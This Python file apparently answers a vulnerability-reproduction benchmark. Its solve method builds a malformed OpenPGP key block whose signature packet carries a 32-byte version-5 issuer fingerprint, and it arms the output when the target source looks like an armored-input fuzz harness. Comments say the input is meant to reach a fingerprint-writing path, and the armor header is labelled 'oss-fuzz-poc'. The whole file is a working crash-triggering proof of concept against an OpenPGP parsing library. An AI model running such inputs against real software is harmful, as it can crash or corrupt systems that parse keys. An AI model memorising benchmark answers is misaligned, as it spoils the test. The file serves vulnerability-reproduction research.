import os
import io
import re
import tarfile
import base64
import struct
import hashlib
import tempfile
from typing import Optional, Iterable


def _encode_new_len(n: int) -> bytes:
    if n < 0:
        raise ValueError("negative length")
    if n < 192:
        return bytes([n])
    if n < 8384:
        nn = n - 192
        return bytes([(nn >> 8) + 192, nn & 0xFF])
    return b"\xFF" + struct.pack(">I", n)


def _pgp_new_packet(tag: int, body: bytes) -> bytes:
    if not (0 <= tag <= 63):
        raise ValueError("bad tag")
    hdr = bytes([0xC0 | tag]) + _encode_new_len(len(body))
    return hdr + body


def _encode_subpacket(sp_type: int, data: bytes) -> bytes:
    ln = 1 + len(data)
    return _encode_new_len(ln) + bytes([sp_type]) + data


def _mpi(value: bytes) -> bytes:
    if not value:
        return b"\x00\x00"
    i = 0
    while i < len(value) and value[i] == 0:
        i += 1
    v = value[i:] if i else value
    if not v:
        return b"\x00\x00"
    bitlen = (len(v) - 1) * 8 + (v[0].bit_length())
    return struct.pack(">H", bitlen) + v


def _det_bytes(seed: bytes, n: int) -> bytes:
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out.extend(hashlib.sha256(seed + struct.pack(">I", ctr)).digest())
        ctr += 1
    return bytes(out[:n])


def _make_rsa_pubkey_v4_packet(bits: int = 1024) -> bytes:
    nbytes = (bits + 7) // 8
    n = bytearray(_det_bytes(b"n-v4", nbytes))
    n[0] |= 0x80
    n[-1] |= 0x01
    e = b"\x01\x00\x01"
    body = bytearray()
    body.append(0x04)  # version
    body += b"\x00\x00\x00\x00"  # creation time
    body.append(0x01)  # RSA Encrypt or Sign
    body += _mpi(bytes(n))
    body += _mpi(e)
    return _pgp_new_packet(6, bytes(body))


def _make_userid_packet(userid: bytes) -> bytes:
    return _pgp_new_packet(13, userid)


def _make_signature_packet_with_issuer_fpr_v5(rsa_bits: int = 1024) -> bytes:
    # Signature packet v4 over (pubkey, userid); not intended to verify.
    # Includes issuer fingerprint subpacket with v5 (32 bytes) to hit fingerprint-writing path.
    hashed_subpackets = _encode_subpacket(2, b"\x00\x00\x00\x00")  # signature creation time
    fpr = hashlib.sha256(b"issuer-fpr-v5").digest()  # 32 bytes
    issuer_fpr_sub = _encode_subpacket(33, bytes([0x05]) + fpr)  # key version 5 + 32 bytes
    issuer_keyid_sub = _encode_subpacket(16, b"\x00" * 8)

    unhashed_subpackets = issuer_fpr_sub + issuer_keyid_sub

    body = bytearray()
    body.append(0x04)  # version
    body.append(0x13)  # Positive certification of a User ID and Public-Key packet
    body.append(0x01)  # RSA
    body.append(0x08)  # SHA256
    body += struct.pack(">H", len(hashed_subpackets))
    body += hashed_subpackets
    body += struct.pack(">H", len(unhashed_subpackets))
    body += unhashed_subpackets
    body += b"\x00\x00"  # left 16 bits of hash

    # RSA signature MPI (dummy); set to modulus size for parse-friendliness.
    nbytes = (rsa_bits + 7) // 8
    sig = bytearray(b"\x00" * nbytes)
    sig[0] = 0x80
    body += _mpi(bytes(sig))

    return _pgp_new_packet(2, bytes(body))


def _crc24(data: bytes) -> int:
    crc = 0xB704CE
    poly = 0x1864CFB
    for b in data:
        crc ^= (b & 0xFF) << 16
        for _ in range(8):
            crc <<= 1
            if crc & 0x1000000:
                crc ^= poly
    return crc & 0xFFFFFF


def _armor(data: bytes, header: str = "PGP PUBLIC KEY BLOCK") -> bytes:
    b64 = base64.b64encode(data).decode("ascii")
    lines = [b64[i:i + 64] for i in range(0, len(b64), 64)]
    crc = _crc24(data)
    crc_bytes = bytes([(crc >> 16) & 0xFF, (crc >> 8) & 0xFF, crc & 0xFF])
    crc_b64 = base64.b64encode(crc_bytes).decode("ascii")
    out = []
    out.append(f"-----BEGIN {header}-----\n")
    out.append("Version: oss-fuzz-poc\n\n")
    out.extend(line + "\n" for line in lines)
    out.append(f"={crc_b64}\n")
    out.append(f"-----END {header}-----\n")
    return "".join(out).encode("ascii")


def _iter_files_in_dir(root: str) -> Iterable[str]:
    for dp, _, fns in os.walk(root):
        for fn in fns:
            yield os.path.join(dp, fn)


def _read_small_file(path: str, limit: int = 200_000) -> Optional[bytes]:
    try:
        st = os.stat(path)
        if not os.path.isfile(path):
            return None
        if st.st_size <= 0:
            return b""
        with open(path, "rb") as f:
            return f.read(min(limit, st.st_size))
    except Exception:
        return None


def _detect_armor_from_text(blob: bytes) -> bool:
    b = blob.lower()
    if b"begin pgp" in b or b"-----begin pgp" in b:
        return True
    if b"ascii armor" in b or b"armored" in b or b"armour" in b:
        return True
    if b"unarmor" in b or b"dearmor" in b:
        return True
    if b"pgp_armor" in b or b"pgp_unarmor" in b:
        return True
    if b"load_save_format_ascii" in b or b"format_ascii" in b:
        return True
    if b"rnp_load_save_format_ascii" in b or b"rnp_load_save_format_armored" in b:
        return True
    if b"armor" in b and (b"pgp" in b or b"openpgp" in b):
        return True
    return False


def _detect_needs_armor(src_path: str) -> bool:
    texts = []
    try:
        if os.path.isdir(src_path):
            for p in _iter_files_in_dir(src_path):
                lp = p.lower()
                if not (lp.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".py", ".java", ".go")) or
                        any(k in lp for k in ("fuzz", "fuzzer", "ossfuzz", "harness", "test"))):
                    continue
                d = _read_small_file(p)
                if not d:
                    continue
                if b"llvmfuzzertestoneinput" in d.lower() or b"fuzzer" in d.lower() or b"openpgp" in d.lower() or b"pgp" in d.lower():
                    texts.append(d)
                    if len(texts) >= 30:
                        break
        else:
            with tarfile.open(src_path, "r:*") as tf:
                count = 0
                for m in tf.getmembers():
                    if count >= 200:
                        break
                    if not m.isfile():
                        continue
                    name = m.name.lower()
                    if m.size <= 0 or m.size > 200_000:
                        continue
                    if not (name.endswith((".c", ".cc", ".cpp", ".h", ".hpp", ".rs", ".py", ".java", ".go")) or
                            any(k in name for k in ("fuzz", "fuzzer", "ossfuzz", "harness", "test"))):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        d = f.read(200_000)
                    except Exception:
                        continue
                    dl = d.lower()
                    if b"llvmfuzzertestoneinput" in dl or b"fuzzer" in dl or b"openpgp" in dl or b"pgp" in dl:
                        texts.append(d)
                        count += 1
                        if len(texts) >= 30:
                            break
    except Exception:
        return False

    combined = b"\n".join(texts[:50])
    return _detect_armor_from_text(combined)


def _build_poc_binary() -> bytes:
    pk = _make_rsa_pubkey_v4_packet(1024)
    uid = _make_userid_packet(b"a@b")
    sig = _make_signature_packet_with_issuer_fpr_v5(1024)
    return pk + uid + sig


class Solution:
    def solve(self, src_path: str) -> bytes:
        data = _build_poc_binary()
        if _detect_needs_armor(src_path):
            return _armor(data)
        return data